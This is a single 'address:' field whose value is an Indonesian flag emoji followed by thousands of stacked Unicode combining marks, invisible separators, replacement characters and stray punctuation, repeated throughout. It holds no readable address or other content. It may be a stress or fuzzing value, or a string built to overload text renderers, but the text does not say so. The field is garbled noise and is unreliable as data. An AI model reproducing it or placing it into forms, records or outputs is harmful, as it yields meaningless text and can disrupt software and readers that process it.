						address: '🇮🇩̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤